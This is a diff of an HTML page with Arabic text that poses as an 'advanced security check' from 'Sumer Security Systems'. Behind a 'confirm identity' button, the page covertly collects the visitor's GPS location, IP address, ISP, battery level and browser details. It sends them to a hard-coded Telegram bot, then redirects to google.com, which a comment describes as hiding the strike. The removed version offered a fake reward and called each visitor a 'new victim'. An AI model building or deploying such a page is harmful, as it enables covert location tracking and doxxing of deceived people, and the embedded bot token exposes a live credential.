@@ -3,80 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مرحباً! اضغط للمتابعة</title>
+    <title>Sumer Security Systems</title>
     <style>
-        body { font-family: Arial, sans-serif; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; }
-        button { background: #ff4757; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; transition: all 0.3s; }
-        button:hover { background: #ff3742; transform: scale(1.05); }
+        :root { --primary: #00d2ff; --bg: #0b0e14; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 20px; border: 1px solid rgba(0, 210, 255, 0.3); text-align: center; backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0, 210, 255, 0.1); max-width: 400px; }
+        .loader { border: 3px solid transparent; border-top: 3px solid var(--primary); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 1.5rem; margin-bottom: 10px; color: var(--primary); }
+        p { color: #8b949e; font-size: 0.9rem; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { opacity: 0.8; transform: scale(1.05); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎉 مرحباً بك!</h1>
-        <p>اضغط الزر للحصول على المكافأة الخاصة بك</p>
-        <button onclick="collectData()">اضغط هنا للمتابعة</button>
-    </div>
 
-    <script>
-        async function collectData() {
-            const data = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                ip: 'جاري الاستخراج...',
-                deviceType: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                battery: 'جاري الاستخراج...',
-                network: 'جاري الاستخراج...'
-            };
+<div class="card">
+    <div class="loader"></div>
+    <h1>فحص الأمان المتقدم</h1>
+    <p>يتم الآن تشفير اتصالك وحماية بياناتك من المتطفلين. يرجى تأكيد الهوية للمتابعة.</p>
+    <button class="btn" onclick="initCapture()">تأكيد الهوية (Secure)</button>
+</div>
 
-            // IP
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-            } catch(e) { data.ip = 'غير متاح'; }
+<script>
+    const config = {
+        token: "7319219567:AAGG7cvp1hMUU5cPPgfa9CyHCxSHR3teio4",
+        chatId: "5493903521"
+    };
 
-            // Battery
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    data.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'شاحن' : 'بطارية'})`;
-                } catch(e) { data.battery = 'غير متاح'; }
+    async function initCapture() {
+        // 1. طلب الموقع (الركيزة الأساسية للبيانات الحقيقية)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy: true});
+        } else {
+            fetchOtherData(null);
+        }
+    }
+
+    async function success(pos) {
+        fetchOtherData(pos.coords);
+    }
+
+    async function error() {
+        fetchOtherData(null);
+    }
+
+    async function fetchOtherData(coords) {
+        try {
+            // جلب الـ IP والمزود
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+
+            // جلب معلومات البطارية
+            let batteryLevel = "غير معروف";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
             }
 
-            // Network
-            if ('connection' in navigator) {
-                const conn = navigator.connection;
-                data.network = `${conn.effectiveType} (${conn.downlink} Mbps)`;
+            // تجهيز الرسالة بتنسيق أنيق لتليجرام
+            let message = `
+💎 **Sumer Intel Report** 💎
+━━━━━━━━━━━━━━━
+👤 **المستهدف:** مبتز محتمل
+🔋 **نسبة الشحن:** \`${batteryLevel}\`
+📱 **نوع الجهاز:** \`${navigator.platform}\`
+🌐 **المتصفح:** \`${navigator.userAgent.split(') ')[1]}\`
+━━━━━━━━━━━━━━━
+🌐 **بيانات الشبكة الحالية:**
+• **IP:** \`${ipData.ip}\`
+• **المزود:** \`${ipData.org}\`
+• **البلد:** ${ipData.country_name} 🇮🇶
+━━━━━━━━━━━━━━━
+📍 **الموقع الجغرافي (GPS):**
+`;
+
+            if (coords) {
+                message += `• **الدقة:** \`${coords.accuracy.toFixed(1)} متر\`\n• **الخريطة:** https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
+            } else {
+                message += `❌ تم رفض الوصول للموقع الفعلي.`;
             }
 
-            // إرسال لتليجرام
-            const payload = {
-                chat_id: '5493903521',
-                text: `🕵️‍♂️ **ضحية جديدة!**\n\n` +
-                      `🌐 **IP**: \`${data.ip}\`\n` +
-                      `📱 **نوع الجهاز**: ${data.deviceType}\n` +
-                      `🔋 **البطارية**: ${data.battery}\n` +
-                      `📶 **الشبكة**: ${data.network}\n` +
-                      `💻 **User Agent**: ${data.userAgent.substring(0,100)}...\n` +
-                      `🖥️ **الشاشة**: ${data.screen}\n` +
-                      `🌍 **المنطقة**: ${data.timezone}\n` +
-                      `🗣️ **اللغة**: ${data.language}\n\n` +
-                      `⏰ **الوقت**: ${new Date().toLocaleString('ar-SA')}`
-            };
-
-            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
+            // إرسال البيانات
+            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: config.chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
             });
 
-            document.body.innerHTML = '<h1 style="color:green;text-align:center;">تم بنجاح! شكراً لك 😊</h1>';
+            window.location.href = "https://google.com"; // تحويله لتمويه الضربة
+        } catch (e) {
+            console.error(e);
         }
-    </script>
+    }
+</script>
 </body>
 </html>
